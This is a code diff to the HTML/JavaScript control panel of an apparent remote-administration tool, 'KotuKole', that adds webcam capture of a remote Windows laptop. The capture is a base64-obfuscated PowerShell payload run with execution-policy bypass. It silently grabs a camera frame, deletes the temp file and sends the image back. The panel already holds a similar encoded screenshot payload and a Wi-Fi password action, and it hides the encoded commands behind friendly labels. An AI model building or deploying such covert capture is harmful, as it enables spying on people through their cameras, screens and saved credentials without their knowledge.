@@ -1071,6 +1071,9 @@
                 <button class="btn-chip" onclick="captureScreenshot()" title="Capture real-time screenshot of physical laptop screen" style="border-color: rgba(56, 189, 248, 0.4); color: #38bdf8;">
                     📸 Screenshot
                 </button>
+                <button class="btn-chip" onclick="captureWebcam()" title="Capture real-time photo from physical laptop webcam" style="border-color: rgba(168, 85, 247, 0.4); color: #c084fc;">
+                    📷 Webcam
+                </button>
 
                 <button class="btn-chip" onclick="runQuickAction('wifi_profiles')" title="17: View all saved Wi-Fi Profiles">
                     📶 Wi-Fi List
@@ -1144,6 +1147,7 @@
                 <div class="quick-chips-row">
                     <span class="chip-label">Suggestions:</span>
                     <span class="chip-pill" onclick="captureScreenshot()" style="border-color: rgba(56,189,248,0.4); color: #38bdf8;">📸 screenshot</span>
+                    <span class="chip-pill" onclick="captureWebcam()" style="border-color: rgba(168,85,247,0.4); color: #c084fc;">📷 webcam</span>
                     <span class="chip-pill" onclick="insertCmd('dir')">dir</span>
                     <span class="chip-pill" onclick="insertCmd('ipconfig')">ipconfig</span>
                     <span class="chip-pill" onclick="insertCmd('tasklist')">tasklist</span>
@@ -1364,6 +1368,8 @@
                     cmd = 'powershell -NoProfile -Command "$m=Get-CimInstance Win32_OperatingSystem; [PSCustomObject]@{ \'Total RAM\'=[string][math]::Round($m.TotalVisibleMemorySize/1MB,1)+\' GB\'; \'Used RAM\'=[string][math]::Round(($m.TotalVisibleMemorySize-$m.FreePhysicalMemory)/1MB,1)+\' GB\'; \'Free RAM\'=[string][math]::Round($m.FreePhysicalMemory/1MB,1)+\' GB\'; \'Usage\'=[string][math]::Round((($m.TotalVisibleMemorySize-$m.FreePhysicalMemory)/$m.TotalVisibleMemorySize)*100,1)+\' %\' } | Format-List"';
                 } else if (action === 'screenshot') {
                     cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -enc WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAVwBpAHQAaABQAGEAcgB0AGkAYQBsAE4AYQBtAGUAKAAnAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAnACkAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAVwBpAHQAaABQAGEAcgB0AGkAYQBsAE4AYQBtAGUAKAAnAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAnACkAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAJABiACAAPQAgAFsAVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAFMAYwByAGUAZQBuAF0AOgA6AFAAcgBpAG0AYQByAHkAUwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwAKACQAYgBtAHAAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEQAcgBhAHcAaQBuAGcALgBCAGkAdABtAGEAcAAgACQAYgAuAFcAaQBkAHQAaAAsACAAJABiAC4ASABlAGkAZwBoAHQACgAkAGcAIAA9ACAAWwBEAHIAYQB3AGkAbgBnAC4ARwByAGEAcABoAGkAYwBzAF0AOgA6AEYAcgBvAG0ASQBtAGEAZwBlACgAJABiAG0AcAApAAoAdAByAHkAIAB7AAoAIAAgACAAIAAkAGcALgBDAG8AcAB5AEYAcgBvAG0AUwBjAHIAZQBlAG4AKAAkAGIALgBMAG8AYwBhAHQAaQBvAG4ALAAgAFsARAByAGEAdwBpAG4AZwAuAFAAbwBpAG4AdABdADoAOgBFAG0AcAB0AHkALAAgACQAYgAuAFMAaQB6AGUAKQAKAH0AIABjAGEAdABjAGgAIAB7AH0ACgAkAGMAbwBkAGUAYwAgAD0AIABbAEQAcgBhAHcAaQBuAGcALgBJAG0AYQBnAGkAbgBnAC4ASQBtAGEAZwBlAEMAbwBkAGUAYwBJAG4AZgBvAF0AOgA6AEcAZQB0AEkAbQBhAGcAZQBFAG4AYwBvAGQAZQByAHMAKAApACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAgACQAXwAuAE0AaQBtAGUAVAB5AHAAZQAgAC0AZQBxACAAJwBpAG0AYQBnAGUALwBqAHAAZQBnACcAIAB9AAoAJABwAGEAcgBhAG0AcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAARAByAGEAdwBpAG4AZwAuAEkAbQBhAGcAaQBuAGcALgBFAG4AYwBvAGQAZQByAFAAYQByAGEAbQBlAHQAZQByAHMAKAAxACkACgAkAHAAYQByAGEAbQBzAC4AUABhAHIAYQBtAFsAMABdACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABEAHIAYQB3AGkAbgBnAC4ASQBtAGEAZwBpAG4AZwAuAEUAbgBjAG8AZABlAHIAUABhAHIAYQBtAGUAdABlAHIAKABbAEQAcgBhAHcAaQBuAGcALgBJAG0AYQBnAGkAbgBnAC4ARQBuAGMAbwBkAGUAcgBdADoAOgBRAHUAYQBsAGkAdAB5ACwAIABbAGwAbwBuAGcAXQA2ADAAKQAKACQAbQBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQAKACQAYgBtAHAALgBTAGEAdgBlACgAJABtAHMALAAgACQAYwBvAGQAZQBjACwAIAAkAHAAYQByAGEAbQBzACkACgAkAGIANgA0ACAAPQAgAFsAQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAG0AcwAuAFQAbwBBAHIAcgBhAHkAKAApACkACgAkAGcALgBEAGkAcwBwAG8AcwBlACgAKQAKACQAYgBtAHAALgBEAGkAcwBwAG8AcwBlACgAKQAKACQAbQBzAC4ARABpAHMAcABvAHMAZQAoACkACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACgAJwA9AD0ASwBPAFQAVQBLAE8ATABFAF8AUwBDAFIARQBFAE4AUwBIAE8AVAA9AD0AZABhAHQAYQA6AGkAbQBhAGcAZQAvAGoAcABlAGcAOwBiAGEAcwBlADYANAAsACcAIAArACAAJABiADYANAAgACsAIAAnAD0APQBFAE4ARABfAFMAQwBSAEUARQBOAFMASABPAFQAPQA9ACcAKQA=';
+                } else if (action === 'webcam') {
+                    cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -sta -enc JAB0AGUAbQBwAEYAaQBsAGUAIAA9ACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAGsAbwB0AHUAawBvAGwAZQBfAHcAZQBiAGMAYQBtAC4AagBwAGcAIgAKACQAYwBvAGQAZQAgAD0AIABAACIACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBEAHIAYQB3AGkAbgBnAC4ASQBtAGEAZwBpAG4AZwA7AAoACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFcAZQBiAEMAYQBtAEMAYQBwAHQAdQByAGUAIAB7AAoAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBhAHYAaQBjAGEAcAAzADIALgBkAGwAbAAiACwAIABFAG4AdAByAHkAUABvAGkAbgB0ACAAPQAgACIAYwBhAHAAQwByAGUAYQB0AGUAQwBhAHAAdAB1AHIAZQBXAGkAbgBkAG8AdwBBACIAKQBdAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAGMAYQBwAEMAcgBlAGEAdABlAEMAYQBwAHQAdQByAGUAVwBpAG4AZABvAHcAQQAoAHMAdAByAGkAbgBnACAAbABwAHMAegBXAGkAbgBkAG8AdwBOAGEAbQBlACwAIABpAG4AdAAgAGQAdwBTAHQAeQBsAGUALAAgAGkAbgB0ACAAeAAsACAAaQBuAHQAIAB5ACwAIABpAG4AdAAgAG4AVwBpAGQAdABoACwAIABpAG4AdAAgAG4ASABlAGkAZwBoAHQALAAgAEkAbgB0AFAAdAByACAAaABXAG4AZAAsACAAaQBuAHQAIABuAEkARAApADsACgAgACAAIAAgAAoAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIAKQBdAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAUwBlAG4AZABNAGUAcwBzAGEAZwBlACgASQBuAHQAUAB0AHIAIABoAFcAbgBkACwAIABpAG4AdAAgAE0AcwBnACwAIABpAG4AdAAgAHcAUABhAHIAYQBtACwAIABpAG4AdAAgAGwAUABhAHIAYQBtACkAOwAKACAAIAAgACAACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHUAcwBlAHIAMwAyAC4AZABsAGwAIgApAF0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABEAGUAcwB0AHIAbwB5AFcAaQBuAGQAbwB3ACgASQBuAHQAUAB0AHIAIABoAFcAbgBkACkAOwAKAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAYgBvAG8AbAAgAEMAYQBwAHQAdQByAGUAKABzAHQAcgBpAG4AZwAgAGYAaQBsAGUAUABhAHQAaAApACAAewAKACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAGgAVwBuAGQAIAA9ACAAYwBhAHAAQwByAGUAYQB0AGUAQwBhAHAAdAB1AHIAZQBXAGkAbgBkAG8AdwBBACgAIgBXAGUAYgBjAGEAbQAiACwAIAAwACwAIAAwACwAIAAwACwAIAA2ADQAMAAsACAANAA4ADAALAAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwAsACAAMAApADsACgAgACAAIAAgACAAIAAgACAAaQBmACAAKABoAFcAbgBkACAAPQA9ACAASQBuAHQAUAB0AHIALgBaAGUAcgBvACkAIAByAGUAdAB1AHIAbgAgAGYAYQBsAHMAZQA7AAoACgAgACAAIAAgACAAIAAgACAAUwBlAG4AZABNAGUAcwBzAGEAZwBlACgAaABXAG4AZAAsACAAMAB4ADAANAAwADAAIAArACAAMQAwACwAIAAwACwAIAAwACkAOwAKACAAIAAgACAAIAAgACAAIABTAGUAbgBkAE0AZQBzAHMAYQBnAGUAKABoAFcAbgBkACwAIAAwAHgAMAA0ADAAMAAgACsAIAA1ADAALAAgADEALAAgADAAKQA7AAoAIAAgACAAIAAgACAAIAAgAFMAZQBuAGQATQBlAHMAcwBhAGcAZQAoAGgAVwBuAGQALAAgADAAeAAwADQAMAAwACAAKwAgADUAMgAsACAAMwAwACwAIAAwACkAOwAKACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUAbQAuAFQAaAByAGUAYQBkAGkAbgBnAC4AVABoAHIAZQBhAGQALgBTAGwAZQBlAHAAKAA4ADAAMAApADsACgAKACAAIAAgACAAIAAgACAAIABTAGUAbgBkAE0AZQBzAHMAYQBnAGUAKABoAFcAbgBkACwAIAAwAHgAMAA0ADAAMAAgACsAIAA2ADAALAAgADAALAAgADAAKQA7AAoAIAAgACAAIAAgACAAIAAgAFMAeQBzAHQAZQBtAC4AVABoAHIAZQBhAGQAaQBuAGcALgBUAGgAcgBlAGEAZAAuAFMAbABlAGUAcAAoADMAMAAwACkAOwAKACAAIAAgACAAIAAgACAAIABTAGUAbgBkAE0AZQBzAHMAYQBnAGUAKABoAFcAbgBkACwAIAAwAHgAMAA0ADAAMAAgACsAIAA0ADEALAAgADAALAAgADAAKQA7AAoAIAAgACAAIAAgACAAIAAgAAoAIAAgACAAIAAgACAAIAAgAHQAcgB5ACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkAbQBhAGcAZQAgAGkAbQBnACAAPQAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAEMAbABpAHAAYgBvAGEAcgBkAC4ARwBlAHQASQBtAGEAZwBlACgAKQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKABpAG0AZwAgACEAPQAgAG4AdQBsAGwAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAbQBnAC4AUwBhAHYAZQAoAGYAaQBsAGUAUABhAHQAaAAsACAASQBtAGEAZwBlAEYAbwByAG0AYQB0AC4ASgBwAGUAZwApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7ACAAcgBlAHQAdQByAG4AIABmAGEAbABzAGUAOwAgAH0ACgAKACAAIAAgACAAIAAgACAAIABTAGUAbgBkAE0AZQBzAHMAYQBnAGUAKABoAFcAbgBkACwAIAAwAHgAMAA0ADAAMAAgACsAIAAxADEALAAgADAALAAgADAAKQA7AAoAIAAgACAAIAAgACAAIAAgAEQAZQBzAHQAcgBvAHkAVwBpAG4AZABvAHcAKABoAFcAbgBkACkAOwAKACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgAHQAcgB1AGUAOwAKACAAIAAgACAAfQAKAH0ACgAiAEAACgBBAGQAZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAGMAbwBkAGUAIAAtAFIAZQBmAGUAcgBlAG4AYwBlAGQAQQBzAHMAZQBtAGIAbABpAGUAcwAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAsACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAAoAJAByAGUAcwAgAD0AIABbAFcAZQBiAEMAYQBtAEMAYQBwAHQAdQByAGUAXQA6ADoAQwBhAHAAdAB1AHIAZQAoACQAdABlAG0AcABGAGkAbABlACkACgBpAGYAIAAoACQAcgBlAHMAIAAtAGEAbgBkACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAdABlAG0AcABGAGkAbABlACkAKQAgAHsACgAgACAAIAAgACQAYgB5AHQAZQBzACAAPQAgAFsASQBPAC4ARgBpAGwAZQBdADoAOgBSAGUAYQBkAEEAbABsAEIAeQB0AGUAcwAoACQAdABlAG0AcABGAGkAbABlACkACgAgACAAIAAgACQAYgA2ADQAIAA9ACAAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACkACgAgACAAIAAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAdABlAG0AcABGAGkAbABlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAIgA9AD0ASwBPAFQAVQBLAE8ATABFAF8AVwBFAEIAQwBBAE0APQA9AGQAYQB0AGEAOgBpAG0AYQBnAGUALwBqAHAAZQBnADsAYgBhAHMAZQA2ADQALAAkAGIANgA0AD0APQBFAE4ARABfAFcARQBCAEMAQQBNAD0APQAiAAoAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIABXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIAWwBOAG8AdABpAGMAZQA6ACAARgBhAGkAbABlAGQAIAB0AG8AIABjAGEAcAB0AHUAcgBlACAAdwBlAGIAYwBhAG0AIABpAG0AYQBnAGUALgAgAFAAbABlAGEAcwBlACAAdgBlAHIAaQBmAHkAIAB3AGUAYgBjAGEAbQAgAGMAbwBuAG4AZQBjAHQAaQBvAG4AIABhAG4AZAAgAGMAYQBtAGUAcgBhACAAcAByAGkAdgBhAGMAeQAgAHMAZQB0AHQAaQBuAGcAcwAuAF0AIgAKAH0A';
                 } else if (action === 'disks') {
                     cmd = 'powershell -NoProfile -Command "Get-PSDrive -PSProvider FileSystem | Select-Object Name, @{N=\'Used(GB)\';E={[math]::Round($_.Used/1GB,1)}}, @{N=\'Free(GB)\';E={[math]::Round($_.Free/1GB,1)}}, @{N=\'Total(GB)\';E={[math]::Round(($_.Used+$_.Free)/1GB,1)}}, Root | Format-Table -AutoSize"';
                 } else if (action === 'wifi_profiles') {
@@ -1396,6 +1402,7 @@
                 if (action === 'specs') cmd = 'lscpu | grep -E "Model name|Architecture|CPU(s)"';
                 else if (action === 'ram') cmd = 'free -h';
                 else if (action === 'screenshot') cmd = 'echo "[Notice: Screen capture requires physical Windows laptop running KotuKole Agent.]"';
+                else if (action === 'webcam') cmd = 'echo "[Notice: Webcam capture requires physical Windows laptop running KotuKole Agent.]"';
                 else if (action === 'disks') cmd = 'df -h';
                 else if (action === 'wifi_profiles') cmd = 'nmcli connection show || ip a';
                 else if (action === 'wifi_pass') cmd = 'echo "Wi-Fi passwords only available on physical laptop."';
@@ -1480,6 +1487,75 @@
             outputEl.appendChild(card);
         }
 
+        // Webcam Capture Helpers
+        function captureWebcam() {
+            closeWebcamModal();
+            runQuickAction('webcam');
+        }
+
+        function openWebcamModal(imgUrl) {
+            const modal = document.getElementById('webcam-modal');
+            const img = document.getElementById('webcam-modal-img');
+            const dlBtn = document.getElementById('btn-download-webcam');
+            const timeEl = document.getElementById('webcam-timestamp');
+            if (modal && img) {
+                img.src = imgUrl;
+                img.classList.remove('zoomed');
+                if (dlBtn) dlBtn.href = imgUrl;
+                if (timeEl) {
+                    const now = new Date();
+                    timeEl.innerText = 'Captured at ' + now.toLocaleTimeString();
+                }
+                modal.style.display = 'flex';
+            }
+        }
+
+        function closeWebcamModal() {
+            const modal = document.getElementById('webcam-modal');
+            if (modal) modal.style.display = 'none';
+        }
+
+        function toggleZoomWebcam() {
+            const img = document.getElementById('webcam-modal-img');
+            if (img) img.classList.toggle('zoomed');
+        }
+
+        function onWebcamOverlayClick(e) {
+            if (e.target.id === 'webcam-modal') {
+                closeWebcamModal();
+            }
+        }
+
+        function renderWebcamCard(imgUrl) {
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            const card = document.createElement('div');
+            card.className = 'term-screenshot-card';
+            card.style.borderColor = 'rgba(168, 85, 247, 0.4)';
+            card.innerHTML = `
+                <div class="term-screenshot-header">
+                    <span style="color:#c084fc;">📷 Laptop Webcam Photo</span>
+                    <span class="term-screenshot-time">${timeStr}</span>
+                </div>
+                <div class="term-screenshot-img-wrap" onclick="openWebcamModal('${imgUrl}')" title="Click to view full screen">
+                    <img src="${imgUrl}" alt="Laptop Webcam" />
+                    <div class="term-screenshot-overlay">🔍 Click to enlarge / view fullscreen</div>
+                </div>
+                <div class="term-screenshot-actions">
+                    <button class="btn-chip" onclick="openWebcamModal('${imgUrl}')" style="border-color:rgba(168,85,247,0.4); color:#c084fc;">🔍 Fullscreen</button>
+                    <a href="${imgUrl}" download="kotukole-webcam-${Date.now()}.jpg" class="btn-chip" style="text-decoration:none;">⬇️ Download (.JPG)</a>
+                </div>
+            `;
+            outputEl.appendChild(card);
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                closeScreenshotModal();
+                closeWebcamModal();
+            }
+        });
+
         // Speak Dialog
         function speakDialog() {
             const text = prompt('ඔබේ Laptop එකේ Speaker එකෙන් ශබ්ද නඟා කියවිය යුතු වාක්‍යය ඇතුළත් කරන්න:', 'Hello boss! KotuKole terminal is connected.');
@@ -1514,6 +1590,26 @@
                     }
                     renderScreenshotCard(imgUrl);
                     openScreenshotModal(imgUrl);
+                    outputEl.scrollTop = outputEl.scrollHeight;
+                    return;
+                }
+            }
+
+            if (typeof text === 'string' && text.includes('==KOTUKOLE_WEBCAM==')) {
+                const match = text.match(/==KOTUKOLE_WEBCAM==([\s\S]*?)==END_WEBCAM==/);
+                if (match) {
+                    const imgUrl = match[1].trim();
+                    const cleanText = text.replace(/==KOTUKOLE_WEBCAM==[\s\S]*?==END_WEBCAM==/, '')
+                                          .replace(/#<\s*CLIXML[\s\S]*?<\/Objs>/i, '')
+                                          .trim();
+                    if (cleanText) {
+                        const extra = document.createElement('div');
+                        extra.className = 'term-out-text';
+                        extra.innerText = cleanText;
+                        outputEl.appendChild(extra);
+                    }
+                    renderWebcamCard(imgUrl);
+                    openWebcamModal(imgUrl);
                     outputEl.scrollTop = outputEl.scrollHeight;
                     return;
                 }
@@ -1594,13 +1690,20 @@
                 return;
             }
 
+            if (cmd.toLowerCase() === 'webcam' || cmd.toLowerCase() === 'camera') {
+                captureWebcam();
+                cmdInput.value = '';
+                return;
+            }
+
             // UI state: Running
             isRunningCommand = true;
             submitBtn.disabled = true;
             submitText.innerText = 'Running...';
             submitSpinner.style.display = 'inline-block';
 
-            const displayCmd = cmd.includes('WwBSAGUAZgBsAGUAYwB0AGkAbwBu') ? 'screenshot (Capturing laptop screen...)' : cmd;
+            const displayCmd = cmd.includes('WwBSAGUAZgBsAGUAYwB0AGkAbwBu') ? 'screenshot (Capturing laptop screen...)' :
+                               cmd.includes('JAB0AGUAbQBwAEYAaQBsAGUAIAA9') ? 'webcam (Capturing laptop webcam photo...)' : cmd;
             appendOutput(displayCmd, 'cmd');
             cmdHistory.push(cmd);
             historyIdx = cmdHistory.length;
@@ -1681,6 +1784,19 @@
                 setTimeout(() => { if (btn) btn.innerText = '🔄 Git Sync'; }, 3000);
             }
         }
+        // SSE Listener for real-time webcam photos uploaded from external agents
+        try {
+            const webcamSSE = new EventSource('/api/events');
+            webcamSSE.onmessage = function(event) {
+                try {
+                    const data = JSON.parse(event.data);
+                    if (data.type === 'webcam_update' && data.url) {
+                        renderWebcamCard(data.url);
+                        openWebcamModal(data.url);
+                    }
+                } catch(e) {}
+            };
+        } catch(e) {}
     </script>
     <!-- Screenshot Modal -->
     <div class="screenshot-modal-overlay" id="screenshot-modal" onclick="onScreenshotOverlayClick(event)">
@@ -1707,6 +1823,35 @@
             </div>
             <div class="screenshot-modal-body">
                 <img id="screenshot-modal-img" src="" alt="Laptop Screen" class="screenshot-preview-img" onclick="toggleZoomScreenshot()" title="Click to Zoom / Toggle fit" />
+            </div>
+        </div>
+    </div>
+
+    <!-- Webcam Modal -->
+    <div class="screenshot-modal-overlay" id="webcam-modal" onclick="onWebcamOverlayClick(event)">
+        <div class="screenshot-modal-card" onclick="event.stopPropagation()">
+            <div class="screenshot-modal-header">
+                <div style="display: flex; align-items: center; gap: 10px;">
+                    <div class="brand-icon" style="width: 32px; height: 32px; font-size: 16px; background: rgba(168,85,247,0.2); border-color: rgba(168,85,247,0.4);">📷</div>
+                    <div>
+                        <h3 style="font-size: 0.95rem; font-weight: 700; color: #fff;">Laptop Webcam Photo</h3>
+                        <span style="font-size: 0.72rem; color: #94a3b8;" id="webcam-timestamp">Captured just now</span>
+                    </div>
+                </div>
+                <div style="display: flex; align-items: center; gap: 8px;">
+                    <a id="btn-download-webcam" href="#" download="kotukole-laptop-webcam.jpg" class="btn-banner btn-banner-blue" style="text-decoration: none;">
+                        ⬇️ Download (.JPG)
+                    </a>
+                    <button class="btn-banner btn-banner-green" onclick="captureWebcam()" title="Retake Photo" style="background: linear-gradient(135deg, #9333ea, #a855f7);">
+                        🔄 Retake
+                    </button>
+                    <button class="btn-banner btn-banner-ghost" onclick="closeWebcamModal()" title="Close" style="padding: 5px 10px; font-size: 0.9rem;">
+                        ✕
+                    </button>
+                </div>
+            </div>
+            <div class="screenshot-modal-body">
+                <img id="webcam-modal-img" src="" alt="Laptop Webcam" class="screenshot-preview-img" onclick="toggleZoomWebcam()" title="Click to Zoom / Toggle fit" />
             </div>
         </div>
     </div>
